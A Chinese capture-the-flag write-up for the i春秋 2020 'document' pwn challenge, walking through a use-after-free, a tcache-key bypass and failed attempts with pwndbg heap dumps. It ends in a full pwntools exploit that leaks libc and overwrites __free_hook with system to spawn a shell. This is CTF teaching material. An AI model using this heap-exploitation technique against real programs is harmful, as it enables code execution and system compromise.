> 例题来源：i春秋2020新春战役PWN之document
>
> 附件下载：
>
> 链接: [https://pan.baidu.com/s/1CSpxIU6fFnc3JKzdxR4xFg](https://pan.baidu.com/s/1CSpxIU6fFnc3JKzdxR4xFg)  密码: lhja
>
> --来自百度网盘超级会员V3的分享
>

# 说明
如果你的pwn环境的glibc版本太低的话，直接使用附件中的libc和ld就行。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611388231416-f4766e0f-0086-4366-accd-345980973761.png)

pwn文件会自动加载同级目录下的libc和ld文件，修改方法：

[PWN进阶（1-4）-修改ELF动态链接到指定的libc库（动态链接库）（待重写）](https://www.yuque.com/cyberangel/rg9gdm/vk7hfg)

# 静态分析
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611388451962-54ec092f-83cd-4567-a18a-d6c911242d8d.png)

保护全开，IDA分析一下：

## add
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611388542184-6a00e65f-0e36-4918-ae52-25edfa02db8e.png)

+ 最多创建7个chunk
+ malloc大小有限制
+ 一个document申请两个chunk
+ 输入的information正好不能溢出

## show
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611388646475-62576993-7ace-4279-bbf8-e5e465d04667.png)

普普通通的打印功能，什么都没有发现。

## edit
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611388755786-c87b19d1-becf-4bca-bd66-480a63d38eb6.png)

+ 修改sex是绕过tcache double free的关键
+ input函数中无法堆溢出
+ 只能修改一次信息

## remove
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611388849721-432e871b-6dcc-4997-b3d7-69a186ce34e3.png)

+ 一个UAF漏洞
+ 只能free掉information，不free malloc(0x8)

# 动态调试
简单的看一下内存（已关闭系统ALSR）

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611389246119-e19a9197-d7dc-4072-9b7b-e28c490ae6c5.png)

```c
pwndbg> x/30gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021 #malloc(0x8)
0x555555759260:	0x0000555555759280	0x0000000000000001
0x555555759270:	0x0000000000000000	0x0000000000000091 #malloc(0x80)
0x555555759280:	0x0a61616161616161	0x0000000000000001
    			#name               #sex
0x555555759290:	0x626262626262620a	0x6262626262626262
    			#information
0x5555557592a0:	0x6262626262626262	0x6262626262626262
......
0x5555557592f0:	0x6262626262626262	0x0a62626262626262
0x555555759300:	0x0000000000000000	0x0000000000020d01 #top_chunk
0x555555759310:	0x0000000000000000	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000000
0x555555759330:	0x0000000000000000	0x0000000000000000
pwndbg> x/6gx 0x555555756060
0x555555756060:	0x0000555555759260	0x0000000000000000 #qword_202060
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x006e6f6973726576
									#其他数据
pwndbg> 
```

值得注意的是：

**<font style="color:#F5222D;">qword_202060是存放chunk指针的地方，由于存在UAF，所以我们只能申请堆块的次数总共为7次。</font>**

# 思路归纳
libc具有key机制，但是可以通过修改tcachebin的key指针来绕过，程序中的edit正好对应了这个需求，这样做可以使堆块形成double free。

# 踩坑1
不要像我一开始傻乎乎的这样做：

```c
for i in range(7):
    add('a'*8,'W','a'*112)
    remove(0)
    edit(i,'b'*112)
    remove(i)
```

第一次循环：

```c
pwndbg> x/30gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091 #free
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6262626262626262	0x6262626262626262
......
0x5555557592f0:	0x6262626262626262	0x6262626262626262
0x555555759300:	0x0000000000000000	0x0000000000020d01
......
0x555555759330:	0x0000000000000000	0x0000000000000000
pwndbg> tcachebin
tcachebins
0x90 [  2]: 0x555555759280 ◂— 0x555555759280
pwndbg> 
```

现在tcachebin中有两个free chunk了，看起来十分美好，紧接着第二次循环：

```c
pwndbg> x/30gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021 
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091 #free
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6262626262626262	0x6262626262626262
......
0x5555557592f0:	0x6262626262626262	0x6262626262626262
0x555555759300:	0x0000000000000000	0x0000000000000021
0x555555759310:	0x0000555555759280	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000020ce1 #top_chunk
0x555555759330:	0x0000000000000000	0x0000000000000000
pwndbg> tcachebin
tcachebins
0x90 [  3]: 0x555555759280 ◂— 0x555555759280
pwndbg>
```

怎么只有3个bin？不应该是4个么？

for循环add一次（回收一个tcachebin），remove两次（free两次），因此合计向tcachebin中放入一个bin

因此7次循环之后只有8个bin：

```c
pwndbg> tcachebin
tcachebins
0x90 [  7]: 0x555555759280 —▸ 0x7ffff7dcdca0 (main_arena+96) —▸ 0x5555557593c0 ◂— 0x0
pwndbg> unsortedbin
unsortedbin
all: 0x555555759270 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555759270
pwndbg> x/50gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091
0x555555759280:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x555555759290:	0x6262626262626262	0x6262626262626262
......
0x5555557592f0:	0x6262626262626262	0x6262626262626262
0x555555759300:	0x0000000000000090	0x0000000000000020
0x555555759310:	0x0000555555759280	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000021
0x555555759330:	0x0000555555759280	0x0000000000000000
0x555555759340:	0x0000000000000000	0x0000000000000021
0x555555759350:	0x0000555555759280	0x0000000000000000
0x555555759360:	0x0000000000000000	0x0000000000000021
0x555555759370:	0x0000555555759280	0x0000000000000000
0x555555759380:	0x0000000000000000	0x0000000000000021
0x555555759390:	0x0000555555759280	0x0000000000000000
0x5555557593a0:	0x0000000000000000	0x0000000000000021
0x5555557593b0:	0x0000555555759280	0x0000000000000000
0x5555557593c0:	0x0000000000000000	0x0000000000020c41
0x5555557593d0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

虽然通过UAF可以泄露出libc基地址，但是这次申请chunk的次数已经用完了，修改chunk的次数也被用完了，所以现在你被卡死了，所以得换个思路。

# 踩坑2
```c
add('a'*0x8,'W','a'*0x70) #0
add('b'*0x8,'W','b'*0x70) #1
add('c'*0x8,'W','c'*0x70) #2
add('d'*0x8,'W','d'*0x70) #3
add('e'*0x8,'W','e'*0x70) #4

remove(0)
edit(0, 'a' * 0x70)
remove(0)

remove(1)
edit(1, 'a' * 0x70)
remove(1)

remove(2)
edit(2, 'a' * 0x70)
remove(2)

remove(3)
edit(3, 'a' * 0x70)
remove(3)
```

执行之后tcachebin已经被填满，同时unsortedbin中也有东西：

```c
pwndbg> tcachebins 
tcachebins
0x90 [  7]: 0x555555759490 —▸ 0x7ffff7dcdca0 (main_arena+96) —▸ 0x5555557595c0 ◂— 0x0
pwndbg> unsortedbin 
unsortedbin
all: 0x555555759480 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555759480
pwndbg> x/120gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6161616161616161	0x6161616161616161
......
0x5555557592f0:	0x6161616161616161	0x6161616161616161
0x555555759300:	0x0000000000000000	0x0000000000000021
0x555555759310:	0x0000555555759330	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000091
0x555555759330:	0x0000555555759330	0x0000555555759010
0x555555759340:	0x6161616161616161	0x6161616161616161
......
0x5555557593a0:	0x6161616161616161	0x6161616161616161
0x5555557593b0:	0x0000000000000000	0x0000000000000021
0x5555557593c0:	0x00005555557593e0	0x0000000000000000
0x5555557593d0:	0x0000000000000000	0x0000000000000091
0x5555557593e0:	0x00005555557593e0	0x0000555555759010
0x5555557593f0:	0x6161616161616161	0x6161616161616161
......
0x555555759450:	0x6161616161616161	0x6161616161616161
0x555555759460:	0x0000000000000000	0x0000000000000021
0x555555759470:	0x0000555555759490	0x0000000000000000
0x555555759480:	0x0000000000000000	0x0000000000000091 #unsortedbin
0x555555759490:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x5555557594a0:	0x6161616161616161	0x6161616161616161
......
0x555555759500:	0x6161616161616161	0x6161616161616161
0x555555759510:	0x0000000000000090	0x0000000000000020
0x555555759520:	0x0000555555759540	0x0000000000000001
0x555555759530:	0x0000000000000000	0x0000000000000091
0x555555759540:	0x6565656565656565	0x0000000000000001
0x555555759550:	0x6565656565656565	0x6565656565656565
......
0x5555557595b0:	0x6565656565656565	0x6565656565656565
0x5555557595c0:	0x0000000000000000	0x0000000000020a41
0x5555557595d0:	0x0000000000000000	0x0000000000000000
0x5555557595e0:	0x0000000000000000	0x0000000000000000
0x5555557595f0:	0x0000000000000000	0x0000000000000000
0x555555759600:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

看来一切正常，可以leak出libc地址，但是添加堆块后bin却出现了问题：

```c
add('f'*0x8,'W','f'*0x70) #5
```

```c
pwndbg> bin
tcachebins
0x90 [  6]: 0x7ffff7dcdd20 (main_arena+224) —▸ 0x7ffff7dcdd10 (main_arena+208) —▸ 0x7ffff7dcdd00 (main_arena+192) —▸ 0x7ffff7dcdcf0 (main_arena+176) —▸ 0x7ffff7dcdce0 (main_arena+160) —▸ 0x7ffff7dcdcd0 (main_arena+144) —▸ 0x7ffff7dcdcc0 (main_arena+128) ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/120gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6161616161616161	0x6161616161616161
......
0x5555557592f0:	0x6161616161616161	0x6161616161616161
0x555555759300:	0x0000000000000000	0x0000000000000021
0x555555759310:	0x0000555555759330	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000091
0x555555759330:	0x0000555555759330	0x0000555555759010
0x555555759340:	0x6161616161616161	0x6161616161616161
......
0x5555557593a0:	0x6161616161616161	0x6161616161616161
0x5555557593b0:	0x0000000000000000	0x0000000000000021
0x5555557593c0:	0x00005555557593e0	0x0000000000000000
0x5555557593d0:	0x0000000000000000	0x0000000000000091
0x5555557593e0:	0x00005555557593e0	0x0000555555759010
0x5555557593f0:	0x6161616161616161	0x6161616161616161
......
0x555555759450:	0x6161616161616161	0x6161616161616161
0x555555759460:	0x0000000000000000	0x0000000000000021
0x555555759470:	0x0000555555759490	0x0000000000000000
0x555555759480:	0x0000000000000000	0x0000000000000021 ##unsortedbin分裂
0x555555759490:	0x6666666666666666	0x0000000000000001
......
0x555555759500:	0x6666666666666666	0x6666666666666666
0x555555759510:	0x0000000000000070	0x0000000000000020
0x555555759520:	0x0000555555759540	0x0000000000000001
0x555555759530:	0x0000000000000000	0x0000000000000091
0x555555759540:	0x6565656565656565	0x0000000000000001
0x555555759550:	0x6565656565656565	0x6565656565656565
......
0x5555557595b0:	0x6565656565656565	0x6565656565656565
0x5555557595c0:	0x0000000000000000	0x0000000000020a41
......
0x555555759600:	0x0000000000000000	0x0000000000000000
pwndbg>
```

从上面看到由于malloc(8)和malloc(0x80)导致unsortedbin分裂为两个chunk，导致程序内存混乱，稍微修改一下，这次free(chunk4)，free最后一个chunk就“应该”不会出现问题了

# 踩坑3
```c
add('a'*0x8,'W','a'*0x70) #0
add('b'*0x8,'W','b'*0x70) #1
add('c'*0x8,'W','c'*0x70) #2
add('d'*0x8,'W','d'*0x70) #3
add('e'*0x8,'W','e'*0x70) #4

remove(0)
edit(0, 'a' * 0x70)
remove(0)

remove(1)
edit(1, 'a' * 0x70)
remove(1)

remove(2)
edit(2, 'a' * 0x70)
remove(2)

remove(3)
edit(3, 'a' * 0x70)
remove(3)

remove(4)
edit(4, 'a' * 0x70)
remove(4)
```

执行之后会发生，

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611395227778-8b98002b-d422-4001-b6d9-97505c79301e.png)

因为当前free的chunk是top chunk，这是由于第一次remove(4)之后，由于被free的chunk与top_chunk相邻，free之后会自动合并到top_chunk中，再次free就会产生double free or corruption

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1611395566423-85cf8a70-bd2a-4ffb-8803-feb5899dec37.png)

> 来自CTF-wiki：
>
> [https://ctf-wiki.org/pwn/linux/glibc-heap/implementation/free/](https://ctf-wiki.org/pwn/linux/glibc-heap/implementation/free/)
>

```c
0x555555759510:	0x0000000000000090	0x0000000000000020
0x555555759520:	0x0000555555759540	0x0000000000000000
    			#指向top_chunk
0x555555759530:	0x0000000000000000	0x0000000000020ad1 #top_chunk
0x555555759540:	0x6565656565656565	0x0000000000000010
0x555555759550:	0x6161616161616161	0x6161616161616161
......
0x5555557595b0:	0x6161616161616161	0x6161616161616161
0x5555557595c0:	0x0000000000000000	0x0000000000020a41
0x5555557595d0:	0x0000000000000000	0x0000000000000000
0x5555557595e0:	0x0000000000000000	0x0000000000000000
0x5555557595f0:	0x0000000000000000	0x0000000000000000
0x555555759600:	0x0000000000000000	0x0000000000000000
pwndbg> top_chunk
Top chunk
Addr: 0x555555759530
Size: 0x20ad1
pwndbg> 
```

# 正解
不需要那么多chunk，**<font style="color:#F5222D;">其实只需要</font>****<font style="color:#F5222D;">修改一下free的顺序：由于tcachebin后进先出，因此我们将要修改的next的chunk最后给free掉就可以了。</font>**

```c
add('a'*0x8,'W','a'*0x70) #0
add('b'*0x8,'W','b'*0x70) #1
add('c'*0x8,'W','c'*0x70) #2
add('d'*0x8,'W','d'*0x70) #3

remove(0)
edit(0, 'a' * 0x70)
remove(0)

remove(1)
edit(1, 'a' * 0x70)

remove(2)
edit(2, 'a' * 0x70)
remove(2)

remove(3)
edit(3, 'a' * 0x70)
remove(3)
```

现在只free一次chunk1，看一下结果：

```c
pwndbg> tcachebins 
tcachebins
0x90 [  7]: 0x555555759490 ◂— 0x555555759490
pwndbg> unsortedbin 
unsortedbin
all: 0x0
pwndbg> x/120gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021 
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091 #free次数：2
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6161616161616161	0x6161616161616161
......
0x5555557592f0:	0x6161616161616161	0x6161616161616161
0x555555759300:	0x0000000000000000	0x0000000000000021
0x555555759310:	0x0000555555759330	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000091 #free次数：1
0x555555759330:	0x0000555555759280	0x0000555555759001
0x555555759340:	0x6161616161616161	0x6161616161616161
......
0x5555557593a0:	0x6161616161616161	0x6161616161616161
0x5555557593b0:	0x0000000000000000	0x0000000000000021
0x5555557593c0:	0x00005555557593e0	0x0000000000000000
0x5555557593d0:	0x0000000000000000	0x0000000000000091 #free次数：2
0x5555557593e0:	0x00005555557593e0	0x0000555555759010
0x5555557593f0:	0x6161616161616161	0x6161616161616161
......
0x555555759450:	0x6161616161616161	0x6161616161616161
0x555555759460:	0x0000000000000000	0x0000000000000021
0x555555759470:	0x0000555555759490	0x0000000000000000
0x555555759480:	0x0000000000000000	0x0000000000000091 #free次数：2
0x555555759490:	0x0000555555759490	0x0000555555759010
0x5555557594a0:	0x6161616161616161	0x6161616161616161
......
0x555555759500:	0x6161616161616161	0x6161616161616161
0x555555759510:	0x0000000000000000	0x0000000000020af1
......
0x555555759600:	0x0000000000000000	0x0000000000000000
pwndbg>
```

第二次free：

```c
remove(1)
```

```c
pwndbg> tcachebins 
tcachebins
0x90 [  7]: 0x555555759490 ◂— 0x555555759490
pwndbg> unsortedbin 
unsortedbin
all: 0x555555759320 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555759320
pwndbg> x/100gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6161616161616161	0x6161616161616161
......
0x5555557592f0:	0x6161616161616161	0x6161616161616161
0x555555759300:	0x0000000000000000	0x0000000000000021
0x555555759310:	0x0000555555759330	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000091 #unsortedbin
0x555555759330:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x555555759340:	0x6161616161616161	0x6161616161616161
......
0x5555557593a0:	0x6161616161616161	0x6161616161616161
0x5555557593b0:	0x0000000000000090	0x0000000000000020
0x5555557593c0:	0x00005555557593e0	0x0000000000000000
0x5555557593d0:	0x0000000000000000	0x0000000000000091
0x5555557593e0:	0x00005555557593e0	0x0000555555759010
0x5555557593f0:	0x6161616161616161	0x6161616161616161
......
0x555555759450:	0x6161616161616161	0x6161616161616161
0x555555759460:	0x0000000000000000	0x0000000000000021
0x555555759470:	0x0000555555759490	0x0000000000000000
0x555555759480:	0x0000000000000000	0x0000000000000091
0x555555759490:	0x0000555555759490	0x0000555555759010
0x5555557594a0:	0x6161616161616161	0x6161616161616161
......
0x555555759500:	0x6161616161616161	0x6161616161616161
0x555555759510:	0x0000000000000000	0x0000000000020af1
......
0x555555759560:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

申请一个chunk：

```c
add('e'*0x8,'W','e'*0x70) #4
```

```c
pwndbg> bin
tcachebins
0x90 [  6]: 0x555555759490 ◂— 0x6565656565656565 ('eeeeeeee')
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555759340 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555759340
smallbins
empty
largebins
empty
pwndbg> x/100gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6161616161616161	0x6161616161616161
......
0x5555557592f0:	0x6161616161616161	0x6161616161616161
0x555555759300:	0x0000000000000000	0x0000000000000021
0x555555759310:	0x0000555555759330	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000021
0x555555759330:	0x0000555555759490	0x0000000000000001
0x555555759340:	0x6161616161616161	0x0000000000000071
0x555555759350:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x555555759360:	0x6161616161616161	0x6161616161616161
......
0x5555557593a0:	0x6161616161616161	0x6161616161616161
0x5555557593b0:	0x0000000000000070	0x0000000000000020
0x5555557593c0:	0x00005555557593e0	0x0000000000000000
0x5555557593d0:	0x0000000000000000	0x0000000000000091
0x5555557593e0:	0x00005555557593e0	0x0000555555759010
0x5555557593f0:	0x6161616161616161	0x6161616161616161
......
0x555555759450:	0x6161616161616161	0x6161616161616161
0x555555759460:	0x0000000000000000	0x0000000000000021
0x555555759470:	0x0000555555759490	0x0000000000000000
0x555555759480:	0x0000000000000000	0x0000000000000091
0x555555759490:	0x6565656565656565	0x0000000000000001
0x5555557594a0:	0x6565656565656565	0x6565656565656565
......
0x555555759500:	0x6565656565656565	0x6565656565656565
0x555555759510:	0x0000000000000000	0x0000000000020af1
......
0x555555759560:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

**<font style="color:#F5222D;">假如只有unsortedbin和tcachebin存在chunk，那么再次申请与tcachebin相同大小的chunk时，优先从tcachebin中申请。</font>**

接下来就是顺理成章的事情，由于有double free的存在，因此修改bin的next指针后申请堆块即可控制任意内存。

+ leak libc_base
+ 计算__free_hook地址
+ 更改chunk

```python
leak_addr=show(1)
print hex(leak_addr)

main_arena_base=leak_addr-0x60
libc_base=main_arena_base-0x3ebc40
print hex(libc_base)
__malloc_hook=libc_base+libc.symbols['__malloc_hook']
__free_hook=libc_base+libc.symbols['__free_hook']
one_gadget_offset=[0x4f3d5,0x4f432,0x10a41c]
one_gadget_addr=one_gadget_offset[1]+libc_base
print hex(one_gadget_addr)
'''
#向__free_hook写入one_gadget
add(p64(__free_hook),'W','e'*0x70)#4
add('f'*0x8,'W','f'*0x70) #5
add(p64(one_gadget_addr),'W','f'*0x70) #6
#gdb.attach(p)
remove(4)
'''
system_addr=libc_base+libc.symbols['system']
add(p64(__free_hook),'W','a'*0x70) #4
add('/bin/sh\x00','W','a'*0x70) #5
add(p64(system_addr),'W','a'*0x70) #6
#gdb.attach(p,'b *$rebase(0x10ED)')
remove(5) #getshell

p.sendline('ls')
p.sendline('cat flag')
p.interactive()
```

注意一点：由于最多创建7个chunk，脚本写到最后无法再次申请chunk，因此我们向__free_hook写入one_gadget或system，这两种方法都可以，最终的内存状况如下：

```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555759000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555759250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555759270
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x555555759300
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555759320
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555759340
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555759360
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555759380
Size: 0x31
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x5555557593b0
Size: 0x20

Allocated chunk | PREV_INUSE
Addr: 0x5555557593d0
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x555555759460
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555759480
Size: 0x91

Top chunk | PREV_INUSE
Addr: 0x555555759510
Size: 0x20af1

pwndbg> bin
tcachebins
0x90 [  4]: 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555759380 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555759380
smallbins
empty
largebins
empty
pwndbg> x/100gx 0x555555759250
0x555555759250:	0x0000000000000000	0x0000000000000021 #1
0x555555759260:	0x0000555555759280	0x0000000000000000
0x555555759270:	0x0000000000000000	0x0000000000000091 #1
0x555555759280:	0x0000555555759280	0x0000555555759010
0x555555759290:	0x6161616161616161	0x6161616161616161
......
0x5555557592f0:	0x6161616161616161	0x6161616161616161
0x555555759300:	0x0000000000000000	0x0000000000000021 #2
0x555555759310:	0x0000555555759330	0x0000000000000000
0x555555759320:	0x0000000000000000	0x0000000000000021 #2(unsortedbin分裂)
0x555555759330:	0x0000555555759490	0x0000000000000001
0x555555759340:	0x6161616161616161	0x0000000000000021 #5(unsortedbin分裂)
0x555555759350:	0x0000555555759490	0x0000000000000001
0x555555759360:	0x6161616161616161	0x0000000000000021 #6(unsortedbin分裂)
0x555555759370:	0x00007ffff7dcf8e8	0x0000000000000001
0x555555759380:	0x6161616161616161	0x0000000000000031 #unsortedbin分裂后剩余的内存 
0x555555759390:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x5555557593a0:	0x6161616161616161	0x6161616161616161
0x5555557593b0:	0x0000000000000030	0x0000000000000020 #3
0x5555557593c0:	0x00005555557593e0	0x0000000000000000
0x5555557593d0:	0x0000000000000000	0x0000000000000091 #3
0x5555557593e0:	0x00005555557593e0	0x0000555555759010
0x5555557593f0:	0x6161616161616161	0x6161616161616161
......
0x555555759450:	0x6161616161616161	0x6161616161616161
0x555555759460:	0x0000000000000000	0x0000000000000021 #4
0x555555759470:	0x0000555555759490	0x0000000000000000
0x555555759480:	0x0000000000000000	0x0000000000000091 #4
0x555555759490:	0x0068732f6e69622f	0x0000000000000001
0x5555557594a0:	0x6161616161616161	0x6161616161616161
......
0x555555759500:	0x6161616161616161	0x6161616161616161
0x555555759510:	0x0000000000000000	0x0000000000020af1 #top_chunk
......
0x555555759560:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &__free_hook-0x2
0x7ffff7dcf8d8 <_IO_stdfile_0_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcf8e8 <__free_hook>:	0x00007ffff7a31550	0x0000000000000001
0x7ffff7dcf8f8 <next_to_use.11807>:	0x6161616161616161	0x6161616161616161
0x7ffff7dcf908 <disallow_malloc_check>:	0x6161616161616161	0x6161616161616161
0x7ffff7dcf918 <list_lock>:	0x6161616161616161	0x6161616161616161
0x7ffff7dcf928 <free_list_lock>:	0x6161616161616161	0x6161616161616161
0x7ffff7dcf938 <dumped_main_arena_start>:	0x6161616161616161	0x6161616161616161
0x7ffff7dcf948 <pedantic>:	0x6161616161616161	0x6161616161616161
pwndbg> 
```

exp：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'

p=process("./pwn")
elf=ELF('./pwn')
libc=ELF('./libc-2.27.so')

def choose(choose):
    p.recvuntil('Give me your choice : \n')
    p.sendline(str(choose))

def add(name,sex,information):
    choose(1)
    p.recvuntil('input name\n')
    p.send(str(name))
    p.recvuntil('input sex\n')
    p.send(str(sex))
    p.recvuntil('input information\n')
    p.send(str(information))

def show(index):
    choose(2)
    p.recvuntil('Give me your index : \n')
    p.sendline(str(index))
    leak_addr=u64(p.recv(6).ljust(8,'\x00'))
    return leak_addr

def edit(index,information):
    choose(3)
    p.recvuntil('Give me your index : \n')
    p.sendline(str(index))
    p.recvuntil('Are you sure change sex?\n')
    p.sendline('Y')
    p.recvuntil('Now change information')
    p.send(str(information))

def remove(index):
    choose(4)
    p.recvuntil('Give me your index : \n')
    p.sendline(str(index))

'''
#test exp.py
add('a'*8,'W','a'*112) 
show(0)
edit(0,'b'*112)
remove(0)
'''
'''
Th3 1ist is fu11:
for i in range(7):
    add('a'*8,'W','a'*112)
    remove(0)
    edit(i,'b'*112)
    remove(i)
'''
'''
// 当前free的chunk不能是top chunk
        if (__glibc_unlikely(p == av->top)) {
            errstr = "double free or corruption (top)";
add('a'*0x8,'W','a'*0x70) #0
add('b'*0x8,'W','b'*0x70) #1
add('c'*0x8,'W','c'*0x70) #2
add('d'*0x8,'W','d'*0x70) #3
add('d'*0x8,'W','d'*0x70) #4

remove(0)
edit(0, 'a' * 0x70)
remove(0)

remove(1)
edit(1, 'a' * 0x70)
remove(1)

remove(2)
edit(2, 'a' * 0x70)
remove(2)

remove(3)
edit(3, 'a' * 0x70)
remove(3)

remove(4)
#edit(4, 'a' * 0x70)
#remove(4)

#remove(1)
#show(1)
add('a'*0x8,'W','a'*0x70) #0
'''
add('a'*0x8,'W','a'*0x70) #0
add('b'*0x8,'W','b'*0x70) #1
add('c'*0x8,'W','c'*0x70) #2
add('d'*0x8,'W','d'*0x70) #3

remove(0)
edit(0, 'a' * 0x70)
remove(0)

remove(1)
edit(1, 'a' * 0x70)

remove(2)
edit(2, 'a' * 0x70)
remove(2)

remove(3)
edit(3, 'a' * 0x70)
remove(3)

remove(1) #unsortedbin

leak_addr=show(1)
print hex(leak_addr)

main_arena_base=leak_addr-0x60
libc_base=main_arena_base-0x3ebc40
print hex(libc_base)
__malloc_hook=libc_base+libc.symbols['__malloc_hook']#最多创建7个chunk
__free_hook=libc_base+libc.symbols['__free_hook']
one_gadget_offset=[0x4f3d5,0x4f432,0x10a41c]
one_gadget_addr=one_gadget_offset[1]+libc_base
print hex(one_gadget_addr)
'''
add(p64(__free_hook),'W','e'*0x70)#4
add('f'*0x8,'W','f'*0x70) #5
add(p64(one_gadget_addr),'W','f'*0x70) #6
#gdb.attach(p)
remove(4)
'''
system_addr=libc_base+libc.symbols['system']
add(p64(__free_hook),'W','a'*0x70) #4
add('/bin/sh\x00','W','a'*0x70) #5
add(p64(system_addr),'W','a'*0x70) #6
#gdb.attach(p,'b *$rebase(0x10ED)')
remove(5) #getshell

#gdb.attach(p)

p.sendline('ls')
p.sendline('cat flag')
p.interactive()
```

